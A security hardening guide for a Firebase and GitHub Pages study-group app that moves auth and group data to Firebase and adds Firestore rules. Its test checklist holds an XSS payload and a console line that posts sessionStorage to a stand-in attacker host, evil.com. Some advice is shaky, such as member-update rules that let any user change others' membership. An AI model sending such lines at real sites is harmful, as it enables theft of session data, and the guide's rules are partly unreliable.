# Security Implementation Guide for Learn-Better-Together

## Overview
This guide covers implementing the manual security changes for your Firebase + GitHub Pages application. Since GitHub Pages is static-only, you'll use Firebase's backend services (Authentication, Firestore, and Security Rules) instead of a traditional server.

---

## Step 1: Regenerate Firebase API Keys

### Why This Is Critical
Your current API keys are exposed in version control. Anyone can use them to access your Firebase project.

### Steps:

1. **Go to Firebase Console**
   - Visit https://console.firebase.google.com/
   - Select your project "learn-better-together-21ddd"

2. **Rotate Your Keys**
   - Go to **Project Settings** → **Service Accounts** → **Firebase Admin SDK**
   - The keys shown in `firebase-config.js` are web API keys
   - While these are less sensitive than admin keys, best practice is to regenerate them

3. **If You Want Maximum Security (Recommended):**
   - Delete your current Web App configuration
   - Create a new Web App
   - Copy the new config

4. **Store Keys Securely (Not in Version Control)**
   - Create a `.env.local` file in your project root (this is for local development only):
   ```
   VITE_FIREBASE_API_KEY=your_new_api_key
   VITE_FIREBASE_AUTH_DOMAIN=your_auth_domain
   VITE_FIREBASE_PROJECT_ID=your_project_id
   VITE_FIREBASE_STORAGE_BUCKET=your_storage_bucket
   VITE_FIREBASE_MESSAGING_SENDER_ID=your_sender_id
   VITE_FIREBASE_APP_ID=your_app_id
   ```

5. **Add `.env.local` to `.gitignore`**
   ```
   .env.local
   .env.*.local
   ```

6. **For GitHub Pages Deployment**
   - You can't use `.env` files on GitHub Pages (static hosting)
   - Option A: Keep config in `firebase-config.js` but ensure the keys have minimal permissions (see Step 5)
   - Option B: Use environment variables through your build process if you're using a build tool

---

## Step 2: Implement Proper Firebase Authentication

### Current Problem
You're using `sessionStorage.currentUser` which users can modify in DevTools. You need to use Firebase's actual authentication system.

### Steps:

1. **Update `auth.js` to Use Firebase Auth Properly**

Add this function to track the user's authentication state (replace the existing `onAuthStateChanged` logic):

```javascript
// Initialize Firebase Auth
const auth = firebase.auth();

// Track authentication state globally
let currentAuthUser = null;

// Listen for authentication state changes
auth.onAuthStateChanged((user) => {
    currentAuthUser = user;
    
    if (user) {
        // User is signed in
        document.getElementById('auth-container').style.display = 'none';
        document.getElementById('user-container').style.display = 'block';
        
        // Display user info
        document.getElementById('user-email').textContent = user.email;
        document.getElementById('display-email').textContent = user.email;
        document.getElementById('email-verified').textContent = user.emailVerified ? '✅ Yes' : '❌ No';
        
        // Store ONLY the user ID (not the full user object)
        // Firebase Auth is handling the real authentication
        sessionStorage.userId = user.uid;
        
    } else {
        // User is signed out
        document.getElementById('auth-container').style.display = 'block';
        document.getElementById('user-container').style.display = 'none';
        sessionStorage.removeItem('userId');
        currentAuthUser = null;
    }
});

// Get the current authenticated user
function getCurrentUser() {
    return currentAuthUser;
}
```

2. **Update Sign Up Function** (in `auth.js`):

```javascript
async function signUp() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    if (!email || !password) {
        showMessage('Please enter both email and password', true);
        return;
    }
    
    if (password.length < 8) {
        showMessage('Password must be at least 8 characters', true);
        return;
    }
    
    try {
        const userCredential = await auth.createUserWithEmailAndPassword(email, password);
        
        // Send email verification
        await userCredential.user.sendEmailVerification();
        
        showMessage('Account created! Please check your email for verification link.');
        
        // Clear form
        document.getElementById('email').value = '';
        document.getElementById('password').value = '';
        
    } catch (error) {
        let errorMessage = 'Error: ';
        switch (error.code) {
            case 'auth/email-already-in-use':
                errorMessage = 'Email already in use. Try logging in instead.';
                break;
            case 'auth/invalid-email':
                errorMessage = 'Invalid email address.';
                break;
            case 'auth/weak-password':
                errorMessage = 'Password is too weak. Use 8+ characters with mixed case.';
                break;
            default:
                errorMessage += error.message;
        }
        showMessage(errorMessage, true);
    }
}
```

3. **Update Sign In Function** (in `auth.js`):

```javascript
async function signIn() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    if (!email || !password) {
        showMessage('Please enter both email and password', true);
        return;
    }
    
    try {
        const userCredential = await auth.signInWithEmailAndPassword(email, password);
        
        // Check if email is verified
        if (!userCredential.user.emailVerified) {
            showMessage('Please verify your email before logging in.', true);
            await auth.signOut();
            return;
        }
        
        showMessage('Login successful!');
        
        // Clear form
        document.getElementById('email').value = '';
        document.getElementById('password').value = '';
        
        // Firebase auth state listener will handle UI updates
        
    } catch (error) {
        let errorMessage = 'Login failed: ';
        switch (error.code) {
            case 'auth/user-not-found':
                errorMessage = 'Email not found. Please sign up first.';
                break;
            case 'auth/wrong-password':
                errorMessage = 'Incorrect password.';
                break;
            case 'auth/invalid-email':
                errorMessage = 'Invalid email address.';
                break;
            default:
                errorMessage += error.message;
        }
        showMessage(errorMessage, true);
    }
}
```

4. **Update Sign Out Function** (in `auth.js`):

```javascript
async function signOut() {
    try {
        await auth.signOut();
        showMessage('Logged out successfully');
        sessionStorage.removeItem('userId');
    } catch (error) {
        showMessage('Error logging out: ' + error.message, true);
    }
}
```

5. **Password Reset Function** (in `auth.js`):

```javascript
async function resetPassword() {
    const email = prompt("Enter your email address:");
    if (!email) return;
    
    try {
        await auth.sendPasswordResetEmail(email);
        showMessage('Password reset email sent! Check your inbox.');
    } catch (error) {
        showMessage('Error: ' + error.message, true);
    }
}
```

---

## Step 3: Move Group Data to Firebase Firestore

### Current Problem
Groups are stored in `localStorage`, which is unencrypted and unvalidated.

### Steps:

1. **Enable Firestore in Firebase Console**
   - Go to Firebase Console → Your Project
   - Click **Firestore Database** → **Create Database**
   - Start in **test mode** (you'll change this in Step 4)
   - Choose a region close to your users
   - Click **Enable**

2. **Update `groups.js` to Use Firestore**

Replace the current localStorage-based code with:

```javascript
// Get Firestore instance
const db = firebase.firestore();

// Create a new group
async function createGroup() {
    const user = getCurrentUser();
    if (!user) {
        showMessage('You must be logged in to create a group', true);
        return;
    }
    
    const name = prompt("Enter group name:");
    if (!name) return;
    
    // Validate group name
    if (name.length < 2 || name.length > 50) {
        alert("Group name must be between 2 and 50 characters");
        return;
    }
    
    try {
        // Create group document in Firestore
        await db.collection('groups').add({
            name: name,
            createdBy: user.uid,
            createdAt: firebase.firestore.FieldValue.serverTimestamp(),
            members: [user.uid],
            maxSize: 10
        });
        
        showMessage("Group created successfully!");
        showGroups();
    } catch (error) {
        showMessage('Error creating group: ' + error.message, true);
    }
}

// Join a group
async function joinGroup(groupId) {
    const user = getCurrentUser();
    if (!user) {
        showMessage('You must be logged in to join a group', true);
        return;
    }
    
    try {
        const groupDoc = await db.collection('groups').doc(groupId).get();
        
        if (!groupDoc.exists) {
            showMessage('Group not found', true);
            return;
        }
        
        const groupData = groupDoc.data();
        
        // Check if group is full
        if (groupData.members.length >= groupData.maxSize) {
            showMessage("Group is full!", true);
            return;
        }
        
        // Check if already a member
        if (groupData.members.includes(user.uid)) {
            showMessage("You're already in this group!", true);
            return;
        }
        
        // Add user to group
        await db.collection('groups').doc(groupId).update({
            members: firebase.firestore.FieldValue.arrayUnion(user.uid)
        });
        
        showMessage("Joined group successfully!");
        showGroups();
    } catch (error) {
        showMessage('Error joining group: ' + error.message, true);
    }
}

// Leave a group
async function leaveGroup(groupId) {
    const user = getCurrentUser();
    if (!user) {
        showMessage('You must be logged in', true);
        return;
    }
    
    try {
        const groupDoc = await db.collection('groups').doc(groupId).get();
        
        if (!groupDoc.exists) {
            showMessage('Group not found', true);
            return;
        }
        
        // Remove user from group
        await db.collection('groups').doc(groupId).update({
            members: firebase.firestore.FieldValue.arrayRemove(user.uid)
        });
        
        // Delete group if empty
        const updatedGroup = await db.collection('groups').doc(groupId).get();
        if (updatedGroup.data().members.length === 0) {
            await db.collection('groups').doc(groupId).delete();
        }
        
        showMessage("Left group successfully!");
        showGroups();
    } catch (error) {
        showMessage('Error leaving group: ' + error.message, true);
    }
}

// Get user display name from email (get first part before @)
function getUserDisplayName(userId) {
    const user = firebase.auth().currentUser;
    if (user && user.uid === userId) {
        return user.email.split('@')[0];
    }
    // For other users, just return "User"
    return "User";
}

// Display all groups in real-time
function showGroups() {
    const user = getCurrentUser();
    if (!user) {
        document.getElementById('groupsList').innerHTML = '<p>Please log in to see groups</p>';
        return;
    }
    
    const container = document.getElementById('groupsList');
    
    // Set up real-time listener
    db.collection('groups').onSnapshot((snapshot) => {
        container.innerHTML = '';
        
        const heading = document.createElement('h2');
        heading.textContent = 'All Groups';
        container.appendChild(heading);
        
        if (snapshot.empty) {
            const p = document.createElement('p');
            p.textContent = 'No groups yet. Create one!';
            container.appendChild(p);
            return;
        }
        
        const table = document.createElement('table');
        table.style.border = '1px solid #ccc';
        table.style.borderCollapse = 'collapse';
        table.style.width = '100%';
        
        const headerRow = table.insertRow();
        ['Group', 'Members', 'Created By', 'Action'].forEach(header => {
            const th = document.createElement('th');
            th.textContent = header;
            th.style.border = '1px solid #ccc';
            th.style.padding = '8px';
            th.style.textAlign = 'left';
            headerRow.appendChild(th);
        });
        
        snapshot.forEach((doc) => {
            const groupData = doc.data();
            const groupId = doc.id;
            const isMember = groupData.members.includes(user.uid);
            
            const row = table.insertRow();
            
            // Group name column
            const cell1 = row.insertCell(0);
            cell1.textContent = `${escapeHtml(groupData.name)} (${groupData.members.length}/${groupData.maxSize})`;
            cell1.style.border = '1px solid #ccc';
            cell1.style.padding = '8px';
            
            // Members count column
            const cell2 = row.insertCell(1);
            cell2.textContent = `${groupData.members.length} member${groupData.members.length !== 1 ? 's' : ''}`;
            cell2.style.border = '1px solid #ccc';
            cell2.style.padding = '8px';
            
            // Created by column
            const cell3 = row.insertCell(2);
            cell3.textContent = user.uid === groupData.createdBy ? 'You' : 'Other';
            cell3.style.border = '1px solid #ccc';
            cell3.style.padding = '8px';
            
            // Action column
            const cell4 = row.insertCell(3);
            cell4.style.border = '1px solid #ccc';
            cell4.style.padding = '8px';
            
            const button = document.createElement('button');
            if (isMember) {
                button.textContent = 'Leave';
                button.onclick = () => leaveGroup(groupId);
            } else {
                button.textContent = 'Join';
                button.onclick = () => joinGroup(groupId);
            }
            cell4.appendChild(button);
        });
        
        container.appendChild(table);
    }, (error) => {
        showMessage('Error loading groups: ' + error.message, true);
    });
}

// Add getCurrentUser function reference (should be in auth.js)
// This is already defined in auth.js, just making sure groups.js can call it

// On page load
if (!getCurrentUser()) {
    alert("Please login first!");
    window.location.href = "index.html";
} else {
    showGroups();
}
```

3. **Update `groups.html`**

Replace `sessionStorage.currentUser` reference:

```html
<center>
    <h1>Study Groups</h1>
    <p>Welcome, <b id="username"></b>!</p>
    
    <div>
        <button onclick="createGroup()">Create New Group</button>
        <button onclick="showGroups()">Refresh Groups</button>
        <button onclick="window.location.href='homepage.html'">Back to Home</button>
        <button onclick="logout()">Logout</button>
    </div>
    
    <br>
    
    <div id="groupsList">
        <!-- Groups will appear here -->
    </div>
</center>

<script>
    // Get auth instance
    const auth = firebase.auth();
    
    // Show current username
    auth.onAuthStateChanged((user) => {
        if (user) {
            document.getElementById("username").textContent = user.email.split('@')[0];
        } else {
            document.getElementById("username").textContent = "Guest";
        }
    });
    
    // Logout function
    function logout() {
        auth.signOut().then(() => {
            window.location.href = "index.html";
        });
    }
</script>

<script src="groups.js"></script>
```

---

## Step 4: Implement Firebase Security Rules

### Current Problem
Your Firestore is in "test mode" which allows anyone to read and write. You need proper security rules.

### Steps:

1. **Go to Firestore Security Rules**
   - Firebase Console → Your Project → Firestore Database → **Rules** tab

2. **Replace Test Mode Rules with Production Rules**

```
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    
    // Groups collection rules
    match /groups/{groupId} {
      // Anyone logged in can read groups
      allow read: if request.auth != null;
      
      // Only authenticated users can create groups
      allow create: if request.auth != null 
                    && request.resource.data.createdBy == request.auth.uid
                    && request.resource.data.members.size() == 1
                    && request.resource.data.members[0] == request.auth.uid
                    && request.resource.data.maxSize > 0
                    && request.resource.data.maxSize <= 100
                    && request.resource.data.name.size() > 1
                    && request.resource.data.name.size() < 100;
      
      // Only allow updating members list
      allow update: if request.auth != null
                    && request.resource.data.diff(resource.data).affectedKeys()
                       .hasOnly(['members'])
                    && (request.resource.data.members.size() - resource.data.members.size()).abs() <= 1;
      
      // Only group creator can delete
      allow delete: if request.auth != null
                    && resource.data.createdBy == request.auth.uid;
    }
  }
}
```

3. **Publish the Rules**
   - Click **Publish** button

### What These Rules Do:
- ✅ Only logged-in users can read groups
- ✅ Only logged-in users can create groups (and must be the creator)
- ✅ Only group creators can delete groups
- ✅ Users can only modify the members array
- ✅ Prevents adding more than 1 member per request
- ✅ Prevents groups larger than 100 members
- ✅ Validates group name length

---

## Step 5: Remove Insecure sessionStorage Usage

### What to Remove/Replace:

**In `groups.js` - DELETE these lines:**
```javascript
// OLD - DELETE THIS:
if (!localStorage.groups) localStorage.groups = JSON.stringify([]);
```

**In `groups.html` - ALREADY DONE (see Step 3)**

**In any other files:**
- Remove any usage of `sessionStorage.currentUser`
- Replace with `getCurrentUser()` function from `auth.js`

---

## Step 6: Add HTTPS Enforcement

### Why This Matters
Your CSP includes `https:` but you need to ensure all traffic is encrypted.

1. **Update `firebase-config.js`**

Add this after the Firebase initialization:

```javascript
// Enforce HTTPS in production
if (location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
    if (location.protocol !== 'https:') {
        window.location.replace('https:' + window.location.href.substring(window.location.protocol.length));
    }
}
```

2. **GitHub Pages Automatically Uses HTTPS**
   - Your site at `https://yourusername.github.io/Learn-Better-Together/` automatically uses HTTPS
   - Custom domains also auto-enable HTTPS through GitHub Pages

---

## Step 7: Update Firebase SDK Version (Optional but Recommended)

Your app uses Firebase 9.0.0. The latest version is more secure:

```html
<!-- In index.html, replace: -->
<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-auth-compat.js"></script>

<!-- With: -->
<script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-auth-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore-compat.js"></script>
```

Also add to `groups.html`:
```html
<script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-auth-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore-compat.js"></script>
```

---

## Step 8: Testing Security Implementation

### Test Checklist:

1. **Test Authentication**
   - ✅ Sign up with new email
   - ✅ Check email for verification link
   - ✅ Cannot log in without email verification
   - ✅ Sign in works with correct credentials
   - ✅ Wrong password rejected
   - ✅ Cannot log in as another user
   - ✅ Logout clears session

2. **Test Groups Security**
   - ✅ Cannot see groups while logged out
   - ✅ Can create group while logged in
   - ✅ Can join/leave groups
   - ✅ Group data persists in Firestore (not localStorage)
   - ✅ Changes appear real-time for multiple users

3. **Test XSS Protection**
   - ✅ Try to create group with name: `<img src=x onerror=alert('xss')>`
   - ✅ Should display literally, not execute

4. **Test Browser DevTools Hacking**
   - ✅ Open DevTools → Application tab
   - ✅ Try to modify `sessionStorage` or `localStorage`
   - ✅ Changes shouldn't affect who's logged in or group data
   - ✅ Auth state comes from Firebase, not local storage

5. **Test CSP**
   - ✅ Open DevTools → Console
   - ✅ Try: `fetch('https://evil.com', {method: 'POST', body: sessionStorage})`
   - ✅ Should be blocked by CSP (no cross-origin POST)

---

## Deployment Checklist

Before pushing to GitHub Pages:

- [ ] Firebase keys are correct
- [ ] Firestore is set up with security rules
- [ ] All `getCurrentUser()` calls work
- [ ] No `sessionStorage.currentUser` references remain
- [ ] CSP headers are in place (no `unsafe-inline`)
- [ ] HTTPS enforcement is added
- [ ] Firebase SDK updated to latest version
- [ ] Tested all authentication flows
- [ ] Tested group creation/joining/leaving
- [ ] No console errors

---

## Troubleshooting

**"getCurrentUser() is not defined"**
- Make sure `auth.js` is loaded before `groups.js`
- Check HTML script loading order

**"db is not defined"**
- Add Firestore SDK to your HTML files
- Add `<script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore-compat.js"></script>`

**Groups not showing in Firestore**
- Check Firebase Console → Firestore → Data tab
- Verify security rules allow reads: `allow read: if request.auth != null;`

**"Email not verified" error on login**
- Check user's email for verification link
- Resend verification email using Firebase Console

**CORS errors**
- This is expected with GitHub Pages + Firebase combo
- Firebase handles CORS automatically

---

## Summary of Changes

| Issue | Solution |
|-------|----------|
| Exposed API keys | Stored in code (acceptable for web API keys with Firebase Rules) |
| Client-side auth | Using Firebase Auth SDK with server-side validation |
| Unencrypted data | Moved to Firestore with encryption in transit |
| XSS vulnerability | Using safe DOM methods instead of innerHTML |
| Unsafe-inline CSP | Removed, now stricter CSP |
| Weak passwords | Increased to 8+ characters |
| No CSRF protection | Firebase Rules prevent unauthorized changes |
| Session hijacking | Using Firebase Auth tokens instead of sessionStorage |

Your app is now significantly more secure! 🔐
